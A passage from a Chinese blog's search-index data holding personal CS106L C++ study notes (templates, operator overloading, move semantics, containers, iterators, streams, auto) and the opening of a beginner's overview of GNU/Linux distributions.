Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"Template classes Fundamental Theorem of Software Engineering: Any problem can be solved by adding enough layers of indirection 模板类之前也见到过：std::vector\u003cint\u003e。 //Example: Structs template\u003ctypename First, typename Second\u003e struct MyPair { First first; Second second; }; template\u003ctypename First, typename Second\u003e class MyPair { public: First getFirst(); Second getSecond(); void setFirst(First f); void setSecond(Second f); private: First first; Second second; }; template\u003cclass First, class Second\u003e class MyPair { public: /*...*/ private: First first; Second second; }; 而其部分函数的实现，也需要加 template： template\u003ctypename First, typename Second\u003e First MyPair::getFirst(){ return first; } 模板类的成员函数和其他函数并不一样，编写的时候最好在一起，而不是像其他普通的编写一样，分为.h 和.cpp 两个文件。因为模板类的成员函数需要编译时的实例化，需要具体的参数生成对应函数的实现。 模板类可以针对特定类型写一个版本： template\u003c\u003e class FooSpecial\u003cfloat\u003e { public: FooSpecial(float var) : var_(var) {} void print() { std::cout \u003c\u003c \"hello float! \" \u003c\u003c var_ \u003c\u003c std::endl; } private: float var_; }; ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:3:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"const keyword const 函数不可以修改类的元素后者传给它的参数。 int * const p; (*p)++ // ok p++ // error const-interface：所有成员函数都可以在定义类的时候被 const 标记 class StrVector { public: using iterator = std::string*; const size_t kInitialSize = 2; /*...*/ size_t size() const; //here bool empty() const; //here std::string\u0026 at(size_t indx); void insert(size_t pos, const std::string\u0026 elem); void push_back(const std::string\u0026 elem); iterator begin(); iterator end(); /*...*/ 这种标记是一种 const 成员函数，它保证了函数内部不会修改 this 实例。 ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:4:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"Operators ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:5:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"运算符重载 std::vector\u003cstd::string\u003e strvec{\"Hello\", \"World\"}; std::cout \u003c\u003c strvec[0]; strvec[1] += \"!\"; 上面这段代码相当于： std::vector\u003cstd::string\u003e strvec{\"Hello\", \"World\"}; std::cout.operator\u003c\u003c(strvec.operator[](0)); strvec.operator[](1).operator+=(\"!\"); 或者是这样： std::vector\u003cstd::string\u003e strvec{\"Hello\", \"World\"}; operator\u003c\u003c(std::cout, strvec.operator[](0)); operator+=(strvec.operator[](1), \"!\"); 每个运算符都有一个与之对应的函数 对于操作符重载时的返回值问题，有的虽然看起来不会有返回值其实也是有的，例如 i += z，返回值就应该是 i，所以 (i += z) += y 这样的操作也是可以的。 像 += 这种都是类自己的成员函数，会被这个类型的变量所调用，所以对这种运算符重载，参数表只有一个参数，通过 *this 还是可以访问到那个变量。 假设实现 + 运算符的重载： 将重载的函数实现成成员函数还是非成员函数的一般规则： 由于 C++的语义原因，一些操作符必须被实现为成员函数（例如[], (), -\u003e, =） 还有一些必须实现为非成员函数（例如 \u003c\u003c，开发者不能覆盖掉 STL 库的实现，所以需要实现为非成员函数） 如果是一元操作符（例如 ++）就实现为成员函数。 如果是二元操作符，而且对这两个变量的操作是一致的（即要么都修改，要么都不修改），就实现成非成员函数（例如 +, \u003c）。 如果是二元操作符，但是对这两个变量的操作不一致，就实现为成员函数（例如 +=）。 如果非成员函数涉及到访问类的私有变量，可以考虑 friends Principle of Least Astonishment (POLA) 设计一个操作符主要是为了模仿传统意义上该操作符的用法 比如之前提到的 += 需要有一个返回值 对称的运算符需要实现为非成员函数 这里说的对称的意思感觉就是运算符两边的表达式可以互换，举的例子是 a + 1 这样的，如果是成员函数的话 1 + a 就不能调用对应函数了。 如果重载了一个运算符，它相关那一套都需要重载。 这里的一套就是上面介绍有哪些运算符中那个分类，一套说的是那里面的一类。 ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:5:1","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"Special Member Functions 它们特殊在如果开发者不自己实现的话，编译器会自动生成，但是编译器自动生成的有时候未必能满足开发者的需要。 这些函数就是：构造函数，析构函数，复制构造函数，复制运算符。其中，复制构造函数会创建一个新的变量（也是在创建新变量的时候被调用的）。 ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:6:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"Copy Semantics 编译器默认生成的复制构造函数会把很多信息都复制一遍，所以新变量和旧变量的指针会指向同一个内存，复制运算符会把要覆写的变量清空然后重新全部复制一遍。 Student(const Student\u0026 other) noexcept: name(other.name), state(other.state), age(other.age){ //body } 重载复制运算符的时候就不能像上面这样写初始化列表了，毕竟它不是构造函数（ 当这个类有一些自己独有的资源时（比如指针，文件流），应该写自己的复制构造函数。 当要实现（删除）一个复制构造函数或者复制运算符或者析构函数的时候，你应该实现（删除）这三个所有。 ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:6:1","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"Move Semantics 移动语义代表了 C++ 的一大哲学——尽量不要牺牲效率。 例如 std::vector 中有一个与 push_back() 类似的函数：emplace_back()。它和 push_back() 不同的是，它可以将参数在内部直接构造插入，而不是像 push_back() 需要创建一个已有的变量。cppreference 网站关于它的条目中 有一个例子： #include \u003cvector\u003e #include \u003ccassert\u003e #include \u003ciostream\u003e #include \u003cstring\u003e struct President { std::string name; std::string country; int year; President(std::string p_name, std::string p_country, int p_year) : name(std::move(p_name)), country(std::move(p_country)), year(p_year) { std::cout \u003c\u003c \"I am being constructed.\\n\"; } President(President\u0026\u0026 other) : name(std::move(other.name)), country(std::move(other.country)), year(other.year) { std::cout \u003c\u003c \"I am being moved.\\n\"; } President\u0026 operator=(const President\u0026 other) = default; }; int main() { std::vector\u003cPresident\u003e elections; std::cout \u003c\u003c \"emplace_back:\\n\"; auto\u0026 ref = elections.emplace_back(\"Nelson Mandela\", \"South Africa\", 1994); assert(ref.year == 1994 \u0026\u0026 \"uses a reference to the created object (C++17)\"); std::vector\u003cPresident\u003e reElections; std::cout \u003c\u003c \"\\npush_back:\\n\"; reElections.push_back(President(\"Franklin Delano Roosevelt\", \"the USA\", 1936)); std::cout \u003c\u003c \"\\nContents:\\n\"; for (President const\u0026 president: elections) std::cout \u003c\u003c president.name \u003c\u003c \" was elected president of \" \u003c\u003c president.country \u003c\u003c \" in \" \u003c\u003c president.year \u003c\u003c \".\\n\"; for (President const\u0026 president: reElections) std::cout \u003c\u003c president.name \u003c\u003c \" was re-elected president of \" \u003c\u003c president.country \u003c\u003c \" in \" \u003c\u003c president.year \u003c\u003c \".\\n\"; } 可以看到： auto\u0026 ref = elections.emplace_back(\"Nelson Mandela\", \"South Africa\", 1994); reElections.push_back(President(\"Franklin Delano Roosevelt\", \"the USA\", 1936)); 移动构造函数和移动符号的函数原型如下： Student(Student\u0026\u0026 other) noexcept; Student\u0026 operator=(Student\u0026\u0026 rhs) noexcept; 但是虽然参数列表里面写的是 \u0026\u0026 右值引用，但是在函数体内部，这个引用本身是一个左值，常规的 = 不再是移动而是复制。为了让复制变成移动，需要用到 std::move()，它会接受一个左值并返回相应的右值。经验之谈：在类成员函数中，如果接受一个 const \u0026 参数并在函数内部将其赋值给其他变量，那么通常可以使用 std::move，除此之外不要使用它。 如果一个类定义了复制构造函数和复制运算符，那么应该也实现一份移动构造函数和移动运算符。 ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:6:2","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于 Templates 的部分","date":"2024-02-03","objectID":"/posts/cs106l_template_algorithms/","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Templates","uri":"/posts/cs106l_template_algorithms/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于 Templates 的部分 Templates ","date":"2024-02-03","objectID":"/posts/cs106l_template_algorithms/:0:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Templates","uri":"/posts/cs106l_template_algorithms/"},{"categories":["Cpp","刷课笔记"],"content":"Templates Function template 应该算得上很自然的想法（🤔 又或者是套娃的另一次应用），我认为这就是对函数的进一层抽象，它将函数的逻辑抽象成与类型无关，比如 template \u003ctypename T\u003e T min(T a, T b) { return (a \u003c b) ? a : b; } template \u003ctypename Type=int\u003e Type myMin(Type a, Type b) { return a \u003c b ? a : b; } 这里的 typename 没有指明类型，实际上可以写成 class T，这样这个函数就不会接受 int 之类的类型。那个 =int 表示其默认类型（虽然我还没认识到写它的意义）。 可以针对性的再写一个特定类型的模板函数: template \u003c\u003e void print_msg\u003cfloat\u003e() { std::cout \u003c\u003c \"print_msg called with float type!\\n\"; } template \u003cbool T\u003e int add3(int a) { if (T) { return a + 3; } return a; } auto minvar = min\u003cint\u003e(1, 2); 隐式存在一个问题在于参数的类型未必能被识别出来（有些类型的定义方式差不多）。不过貌似编译器这时候会报错。 从一个实际的类型推广到一个模板，这个过程被称为 Concept Lifting。对于隐式类型的来说，这种提升可能会导致传入一些不可以工作的类型（比如函数内部使用了 = 赋值，但 stream 是不可以这样做的） 毕竟有了函数指针，其实可以把抽象做的更细一些。比如 Predicate Functions template \u003ctypename InputIt, typename UniPred\u003e int count_occurrences(InputIt begin, InputIt end, UniPred pred) { int count = 0; for (auto iter = begin; iter != end; ++iter) { if (pred(*iter)) count++; } return count; } bool isVowel(char c) { std::string vowels = \"aeiou\"; return vowels.find(c) != std::string::npos; } std::string str = \"Xadia\"; count_occurrences(str.begin(), str.end(), isVowel); C++20 允许开发者显示指定其 template 类型的要求，具体可以参见文档：Constraints and concepts (since C++20) 和 Requires expression (since C++20) ","date":"2024-02-03","objectID":"/posts/cs106l_template_algorithms/:1:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Templates","uri":"/posts/cs106l_template_algorithms/"},{"categories":["Cpp","刷课笔记"],"content":"Lamdba \u0026 Algorithms Lamda function: auto func = [capture-clause](parameters)-\u003ereturn-value{ // body } C++14 开始，这个 return-value 是可选的。 [] // captures nothing [limit] // captures lower by value [\u0026limit] // captures lower by reference [\u0026limit, upper] // captures lower by reference, higher by value [\u0026, limit] // captures everything except lower by reference [\u0026] // captures everything by reference [=] // captures everything by value auto isMoreThan = [limit] (int n) { return n \u003e limit; }; isMoreThan(6); //true 有了这个之后，也就不需要像之前那样定义Predicate Functions了，可以直接写 lamdba。 STL 的一些 algorithm 不能用于开发者自定义的类型（比如寻找最小值之类的），这时候需要用到 lambda 函数。 比如对于这样的 vector: std::vector\u003cStudent\u003e vecstu{{1, 2, 3.0}, {2, 2, 5.0}}; 直接使用 std::minmax_element() 是无法通过编译的 auto [min, max] = std::minmax_element(vecstu.begin(), vecstu.end()); 额，根据我看到的录像那里，其开发环境是没有在编译前给出预警的。但是我的 vscode 在只给了两个参数的时候： In template: invalid operands to binary expression ('Student' and 'Student') clang(typecheck_invalid_operands) 这时候就可以加一个 lamdba 函数，并传给 minmax_element() auto compareStudent = [](Student \u0026s1, Student \u0026s2){ return s1.averge \u003c s2.averge; }; auto [min, max] = std::minmax_element(vecstu.begin(), vecstu.end(), compareStudent); 在 std::copy 这个函数中，如果传入的 iterator 指向的 container 没有足够的空间，那么就会复制到为初始化的内存中，这时候应该传入一个 iterator adaptor。这种函数可以给 iterator 加点料（比如 back_inserter() 会让返回的 iterator 在赋值不存在的空间时扩展 container）。 引用上一章一开始给出的代码： int main() { std::vector\u003cint\u003e vec(20); std::generate(vec.begin(), vec.end(), rand); std::sort(vec.begin(), vec.end()); std::copy(vec.begin(), vec.end(), std::ostream_iterator\u003cint\u003e(cout, \"\\n\")); }","date":"2024-02-03","objectID":"/posts/cs106l_template_algorithms/:2:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Templates","uri":"/posts/cs106l_template_algorithms/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于 container 和 iterators 的部分","date":"2024-02-02","objectID":"/posts/cs106l_container_iterator/","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Containers \u0026 Iterators","uri":"/posts/cs106l_container_iterator/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于 container 和 iterators 的部分 Containers STL 是一个历史相较悠久并且一直在更新的一个标准库，它提供了很多算法供开发者使用 int main() { std::vector\u003cint\u003e vec(20); std::generate(vec.begin(), vec.end(), rand); std::sort(vec.begin(), vec.end()); std::copy(vec.begin(), vec.end(), std::ostream_iterator\u003cint\u003e(cout, \"\\n\")); } 这 5 行代码，就完成了对 vector 元素的随机化赋值并排序，然后输出到 console 上这一系列的工作。 ","date":"2024-02-02","objectID":"/posts/cs106l_container_iterator/:0:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Containers \u0026 Iterators","uri":"/posts/cs106l_container_iterator/"},{"categories":["Cpp","刷课笔记"],"content":"Sequence Containers 这是一种数据结构，提供了对元素序列的访问 std::vector\u003cT\u003e std::deque\u003cT\u003e std::list\u003cT\u003e std::array\u003cT\u003e std::foraword_list\u003cT\u003e 如果越界访问，vec.at(i) 会抛出一个异常，而 vec[i] 会是一个 undefined behavior Sequence Containers 是一种特殊的 Containers，因为它是顺序的。 正如关于数组和链表之间老生长谈的对比一样，在 vector 的前面添加一个元素还是很难绷的，C++提供了另一种数据结构处理这种情况：std::deque\u003cT\u003e vector 有 push_back() 函数添加变量，deque 除了 push_back() 有 push_front() 可以在前面插入 A deque is a double ended queue deque 的实现是将多个 vector 作为枝干，一个 vector 作为主干。如果你从后插入，那就将元素插入最后面枝叶里面，如果最后面那个满了就给主干多加一个，如果主干满了不能加枝叶了那就换一个更长的主干。插入前面是类似的操作。 有两种经典的数据结构——栈和队列，在这里它们被称为 Container Adaptors。它们会通过对 Container 做一些调整来适应它们自身数据结构的定义。在 C++ 文档中，它们的描述都会有这么一句： The std::stack class is a container adaptor that gives the programmer the functionality of a stack - specifically, a LIFO (last-in, first-out) data structure. The std::queue class is a container adaptor that gives the functionality of a queue - specifically, a FIFO (first-in, first-out) data structure. 正如 C++ 设计哲学所说的那句赋予开发者完全的掌控权，所以 stack 虽然是默认用 deque 实现的，但开发者可以自己选择使用什么 container（比如 vector）实现的 stack。（在文档中也有叙述：std::stack 额，按照我的理解，这句话所说的代码应该是这么写： std::stack\u003cint, std::vector\u003cint\u003e\u003e st; 查找 vector 可以使用std::find ","date":"2024-02-02","objectID":"/posts/cs106l_container_iterator/:1:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Containers \u0026 Iterators","uri":"/posts/cs106l_container_iterator/"},{"categories":["Cpp","刷课笔记"],"content":"Associative Containers std::map\u003cT1, T2\u003e std::set\u003cT\u003e std::unordered_map\u003cT1, T2\u003e std::unordered_set\u003cT\u003e 正如前面所说，Sequence Containers 是顺序的，可以通过索引来访问，而 Associative Containers 是不能通过索引来访问的。 虽然是不能通过索引访问，但是 std::map\u003cT1, T2\u003e 和 std::set\u003cT\u003e 会按照大小顺序排列。如果这里存储的是开发者自定义的类型，可以定义用于比较两个实例的大小的小于号帮助它按照顺序排列。vector 会有 sort 函数用于排序，这里面也是会存在这个问题，如果 vector 存储的是开发者自定义的类型，要么是实现这个类型的小于号，要么使用 lamdba 函数 map.at(key) 和 may[key] 区别类似之前提到的，前者不存在的话会抛出异常，后者默认创建它。 可以通过map.count(key) 来查看是否存在。C++20 也支持了var.contains() 来查找：std::set\u003cKey,Compare,Allocator\u003e::contains，std::map\u003cKey,T,Compare,Allocator\u003e::contains。 map 的 key 重复出现的话被称为 multimap ","date":"2024-02-02","objectID":"/posts/cs106l_container_iterator/:2:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Containers \u0026 Iterators","uri":"/posts/cs106l_container_iterator/"},{"categories":["Cpp","刷课笔记"],"content":"Iterators 它允许开发者迭代访问任何 containers 比如 map.begin()，它会返回一个 iterator，这个 iterator 指向第一个元素。就像这样： std::map\u003cint, int\u003e::iterator it = mymap.begin(); ++it 会让这个 iterator 指向下一个元素。*it 可以访问这个 iterator 实际指向的值，这里也可以发现 iterator 和指针是差不多玩意。 map 的 iterator 和其他的 container 有些不同——因为 map 有两个值，它的 iterator 实际上是 std::pair\u003cstring, int\u003e std::map\u003cstd::string, int\u003e mymap; mymap.insert({\"test\", 1}); for(const auto\u0026 thing : mymap){ std::cout \u003c\u003c thing.first \u003c\u003cstd::endl; } 在 vector 中，iterator 可以通过 begin() + 3 这样的方式挪动，但 std::list 等就不可以这么做，这是因为 container 的实现略有不同，但是 iterators 的实现就为了消除 containers 的区别从而用一种通用的方式调用 container。所以存在 5 种 iterator。 Input Output Forward Bidirectional Random Access 上述的这几种 iterator 都有上面所介绍的那些功能（++it什么的） 第一种 input iterator 只能被读，只能向前走，而且只能+1，比如 find() 或者 count() 这样的只需要遍历的地方中就会用到它，C++文档中也有描述： Output iterator 和 input iterator 类似，只不过是只写的。copy这个函数会用到这个 Forward iterator 同时具有 output iterator 和 input iterator 的特点，即 RW 它都拿到了。replace() 函数会用到这个，还有就是之前 Sequence Containers 上提到的std::foraword_list\u003cT\u003e Bidirectional iterator 具有 Forward iterator 的功能，并且这个可以 --。在 std::map，std::set，std::list，或者reverse() 中会看到 Random access iterator 具有 Bidirectional iterator 的功能并且不受递增递减的约束，而是可以随意访问。在std::vertor，std::string，pointer 中都会使用它，所以这个是最常用的。 ","date":"2024-02-02","objectID":"/posts/cs106l_container_iterator/:3:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Containers \u0026 Iterators","uri":"/posts/cs106l_container_iterator/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于 Streams 和 type 的部分","date":"2024-02-01","objectID":"/posts/cs106l_stream_type/","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Streams \u0026 Type","uri":"/posts/cs106l_stream_type/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于 Streams 和 type 的部分 Streams ","date":"2024-02-01","objectID":"/posts/cs106l_stream_type/:0:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Streams \u0026 Type","uri":"/posts/cs106l_stream_type/"},{"categories":["Cpp","刷课笔记"],"content":"String Stream 使用 Stream 缘于程序需要与外部资源交互。 #include \u003ciostream\u003e #include \u003csstream\u003e using namespace std; int main() { ostringstream oss(\"Ito En Green Tea\"); cout \u003c\u003c oss.str() \u003c\u003cendl; oss \u003c\u003c 16.9 \u003c\u003c \" Ounce \"; cout \u003c\u003c oss.str() \u003c\u003c endl; return 0; } 使用 g++ 编译并运行： $ g++ -std=c++17 test.cpp -o test $ ./test Ito En Green Tea 16.9 Ounce n Tea 因为 stream 创建后，指针处于头部，所以写入的时候会从头部开始覆盖写入，如果给 oss() 传入其他参数可以控制这个模式，比如改成 ostringstream oss(\"Ito En Green Tea\", stringstream::ate); 之后，指针会指向尾端。 istringstream iss(oss.str()); double ammount; string struint; iss \u003e\u003e ammount \u003e\u003e struint; iss 在输出的时候会根据空格分隔这个 stream。 对于移动 stream 指针的需求，可以使用下边这份代码： #include \u003ciostream\u003e #include \u003csstream\u003e using namespace std; int main() { ostringstream oss(\"Ito En Green Tea \"); oss \u003c\u003c 16.9; fpos pos = oss.tellp() + streamoff(3); oss.seekp(pos); oss \u003c\u003c \"Black\"; cout \u003c\u003c oss.good() \u003c\u003c endl; return 0; } i/ostringstream 都有快速的错误检查，分别为good()、fail()、eof()、bad。 good: ready for read/write. fail: previous operation failed, all future operation frozen. eof: previous operation reached the end of buffer content. bad: external error, likely irrecoverable. iss.good() 就会返回一个 bool 表示该 stream 是否出错。类似： iss \u003e\u003e ch; if(iss.fail()) throw domain_error(...); 还有一种隐式转换成 bool 的写法会更简短，二者是等价的： if(!(iss \u003e\u003e ch)) throw domain_error(...); 比如一个将 string 转为 int 的函数可以这么写： int stringToInteger(const string\u0026 str){ istringstream iss(str); int result; char remain; if(!(iss \u003e\u003e result) || iss \u003e\u003e remain) throw domain_error(...); return result; } 什么时候应该使用 string stream 处理字符串的时候 格式化输出或输入（一些 stream manipulators，比如 endl, hex, uppercase 之类的） 解析成不同的类型 ","date":"2024-02-01","objectID":"/posts/cs106l_stream_type/:1:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Streams \u0026 Type","uri":"/posts/cs106l_stream_type/"},{"categories":["Cpp","刷课笔记"],"content":"Input stream \u0026 Output steam cin, standard input stream cout, standard output stream (buffered) cerr, standard error stream (unbuffered) clog, standard error stream (buffered) int age; string name; string home; cout \u003c\u003c \"What is your name?\" \u003c\u003c endl; cin \u003e\u003e name; cout \u003c\u003c \"What is your age?\" \u003c\u003c endl; cin \u003e\u003e age; cout \u003c\u003c \"Where are you from?\" \u003c\u003cendl; cin \u003e\u003e home; cout \u003c\u003c \"Hello, \" \u003c\u003c name \u003c\u003c \" (age \" \u003c\u003c age \u003c\u003c \" from \" \u003c\u003c home \u003c\u003c \")\" \u003c\u003cendl; 对于上面这段代码，如果你输入 Avery Wang，程序会直接走到终点： $ g++ -std=c++17 -Wall test.cpp -o test $ ./test What is your name ? Avery Wang What is your age ? Where are you from ? Hello, Avery (age 0 from ) cin 会读到下一个空白符，所以第一个 cin 只会把 Avery 读进去，并且指针更新到了那个空白符的位置，之后 cin \u003e\u003e age 的时候，由于 buffer 不为空，所以会直接尝试把 Wang 读成 int，但是失败了，这时候 fail bit 打开，之后的 cin 也不会进行了。 这就是cin带来的问题了： cin 会读一整行到 buufer 中，但是会用空格符分隔开递出。 buffer 中可能会有残余的数据导致用户无法及时地被提示应该输入 cin fail 了之后就再也不会执行 cin 了 如果使用getline()，就可以避免这个问题。 getline(cin, name, '\\n'); 第三个参数就是一个标记，getline() 会读到这个字符之前（也就是不包括这个字符），并把指针更新到这个字符之后。但如果你把第三个 home 变量的读取也改成了 getline() 读取，程序运行的时候会跳过它，因为 cin \u003e\u003e age 把指针更新到了 \\n 之前，而 getline() 会直接读到 \\n 之前（也就是空数据）。就像这样： A v e r y _ W a n g \\n 2 0 \\n 这里的_指的是空格符。 可以在第二个 getline() 之前加上一句 cin.ignore() 跳过一个字符（也就是\\n）来解决这个问题。 std::cout 是 std::ostream 定义的全局的 constant 对象，std::ostream 会将输入的数据类型都转成 string 并发送到 stream，而 std::cout 是会将这个 output stream 发送到 console 上。 std::cin 是 std::istream 定义的全局 constant 对象。这里的 \u003e\u003e 会一直读取用户的输入直到 whitespace，这里的 whitespace 是指 Tab, space, newline。 ","date":"2024-02-01","objectID":"/posts/cs106l_stream_type/:2:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Streams \u0026 Type","uri":"/posts/cs106l_stream_type/"},{"categories":["Cpp","刷课笔记"],"content":"File Stream std::ofstream，只能用 \u003c\u003c 操作符传递数据，它会将数据类型转成 string 并发送到 file stream 上。 std::ifstream，只能用 \u003e\u003e 操作符传递数据。 std::ofstream out(\"out.txt\"); // out is now an ofstream that outputs to out.txt out \u003c\u003c 5 \u003c\u003c std::endl; // out.txt contains 5 std::ifstream in(\"out.txt\"); // in is now an ifstream that reads from out.txt string str; in \u003e\u003e str; // first word in out.txt goes into str Uniform initialization: 使用大括号来初始化变量，适用于所有类型 std::vector\u003cint\u003e vec{1,3,5}; std::pair\u003cint, string\u003e numSuffix1{1,\"st\"}; Student s{\"Frankie\", \"MN\", 21}; possible! int x{5}; string f{\"Frankie\"}; 但要注意对 vector 大括号和括号之间的区别： std::vector\u003cint\u003e vec1(3,5); // makes {5, 5, 5}, not {3, 5}! //uses a std::initializer_list (more later) std::vector\u003cint\u003e vec2{3,5}; // makes {3, 5} Type ","date":"2024-02-01","objectID":"/posts/cs106l_stream_type/:3:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Streams \u0026 Type","uri":"/posts/cs106l_stream_type/"},{"categories":["Cpp","刷课笔记"],"content":"Type alias 类型别名是一个很有用的东西，比如对于下边这样的代码： std::unordered_map\u003cforward_list\u003cStudent\u003e, unordered_set\u003e::iterator begin = studentMap.cbegin(); std::unordered_map\u003cforward_list\u003cStudent\u003e, unordered_set\u003e::iterator end = studentMap.cend(); 可以使用别名简化 using map_iterator = std::unordered_map\u003cforward_list\u003cStudent\u003e, unordered_set\u003e::iterator; map_iterator begin = studentMap.cbegin(); map_iterator end = studentMap.cend(); C++引入了 auto 关键字，auto 的本质是要让编译器找出这个类型。 auto begin = studentMap.cbegin(); auto end = studentMap.cend(); 又比如这样： auto func = [](auto i) {return i*2}; 这是一个 lamdba 函数，你并不知道这是什么类型，编译器会自动为此创建一个类的实例，由于开发者不知道编译器会为这个类起什么名字，所以需要用 auto。 ","date":"2024-02-01","objectID":"/posts/cs106l_stream_type/:4:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Streams \u0026 Type","uri":"/posts/cs106l_stream_type/"},{"categories":["Cpp","刷课笔记"],"content":"When auto should be used AAA 原则： almost always auto 在代码上下文清晰的时候使用auto 当用确切的类型定义不重要的时候使用auto 当严重破坏了可读性的时候不要使用auto pair\u003cint, int\u003e findPriceRange(int dist){ int min = static_cast\u003cint\u003e(dist * 0.08 + 100); int max = static_cast\u003cint\u003e(dist * 0.36 + 750); return make_pair(min, max); } int main() { int dist = 6452; auto [min, max] = findPriceRange(dist); cout \u003c\u003c \"You can find price between: \" \u003c\u003c min \u003c\u003c \" and \" \u003c\u003c max \u003c\u003cendl; return 0; } 这样的代码更加的现代一些，findPriceRange() 函数只需要传一个参数dist，返回 min 和 max 的 pair，这样也更加自然（对比传入三个参数：dist, min, max）。 像上面这个代码寻找区间的代码写成库函数给开发者调用的话是很不友好的，因为返回值没有做出更好的区分表明到底谁是 min，谁是 max，这时候可以使用结构体来对返回值进行一层抽象。不过在 C++中，结构体定义变量的时候 struct 关键字是可选的，比如： struct Student{ int number; int age; }; Student st{1, 2}; std::cout \u003c\u003c \"age: \" \u003c\u003c st.age \u003c\u003c \", number: \" \u003c\u003c st.number \u003c\u003c std::endl; 在 C 中，这需要typedef才能实现 Structured binding：一次性将复合类型变量的元素取值操作完成 auto p = std::make_pair(“s”, 5); string a = s.first; int b = s.second; 使用了 Structured binding 就可以写成下边这样： auto p = std::make_pair(“s”, 5); auto [a, b] = p; C++ 默认赋值是 copy 的，如果函数传参涉及修改原数据应该用 \u0026 引用，如果在其函数内部会出现对这种参数的赋值，也需要加 \u0026 ： void shift(vector\u003cpair\u003cint, int\u003e\u003e\u0026 nums) { for (auto\u0026 [num1, num2]: nums) { num1++; num2++; } }","date":"2024-02-01","objectID":"/posts/cs106l_stream_type/:5:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Streams \u0026 Type","uri":"/posts/cs106l_stream_type/"},{"categories":["Linux_杂谈"],"content":"介绍了大部分主流的 GNU/Linux 发行版","date":"2023-12-01","objectID":"/posts/distrointro/","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"面向 beginner: GNU/Linux 发行版浅评与介绍 2025 05 02 更新: 修改了一些语法问题，添加了 Fedora Silverblue 的介绍，删除了一些过时的评价。 这里我会介绍常见的几个 GNU/Linux 发行版，这里我会假定你对计算机领域的一些知识有了解。 首先，选择 GNU/Linux 发行版这件事，很大程度上等同于选择什么软件包管理器，选择什么样的系统更新策略。 因为软件就在那里不会改变，这与发行版无关，发行版之间的不同的原因可以认为是使用的软件包管理器导致的。软件包管理器大概可分成两种类型：直接装二进制软件包和从拉取源代码开始编译。系统的更新策略一般分成随版本的更新，比如 Ubuntu 的 LTS ( Long-term support ) 是推送五年的安全更新，之后就要换更新的 LTS 版本了；以及滚动更新，这样会一直向前更新，也就不会有版本的概念。 这里我再解释一下为什么我特地加上 GNU/Linux，这就表明了一些 de-GNU 的 Linux 发行版不会在这里（在我看来，de-GNU 这个词的意思指的是在系统中去掉 GNU 的软件），而且我也没用过这样的发行版。说实话，我很少看到 de-GNU 这样的字眼，GNU 对开源世界的贡献十分大，我很少会看到有人会批驳它什么，我更多的看到的是 de-Google，指在移动端避免 GMS 等服务。 There really is a Linux, and these people are using it, but it is just a part of the system they use. Linux is the kernel: the program in the system that allocates the machine’s resources to the other programs that you run. The kernel is an essential part of an operating system, but useless by itself; it can only function in the context of a complete operating system. Linux is normally used in combination with the GNU operating system: the whole system is basically GNU with Linux added, or GNU/Linux. All the so-called “Linux” distributions are really distributions of GNU/Linux. – https://www.gnu.org/gnu/linux-and-gnu.html 从这里看到，GNU 认为应该将以 GNU 为基础的 “Linux 发行版” 都叫成 GNU/Linux，因为 Linux 指代的应该是 Linux kernel，而非一整套系统。GNU 工具链确实是基本上所有 Linux 发行版的必备了，不过依旧存在一些一定程度上要 de-gnu 的 Linux 发行版。当然，我们应该尊重一下发行版官方给出的名字，比如 Debian 而不是 Debian Linux。 这里我先说一下 GNU 为什么这么重要，以下的部分内容是我的个人看法 。我认为很大的原因是 GNU 的软件都很不错，而且出现的也足够早，这就是原因。在 Linux kernel 还没发布的时候，GNU 项目早就开始写了，它们的目的是要写一个完全自由的操作系统。它们先开始写一些操作系统必备的程序，比如文本编辑器，编译器等等，但当最后写操作系统内核的时候，由于想要实现一个微内核 GNU Hurd，但是微内核调试更为困难，这极大的拖慢了开发进度。这个时候 Linux kernel 就已经发布出来，并且可以运行 GNU 的各种程序。 GNU 这部分十分重要，而且一定程度上没太多替代品。Linux 发行版运行必备的 libc 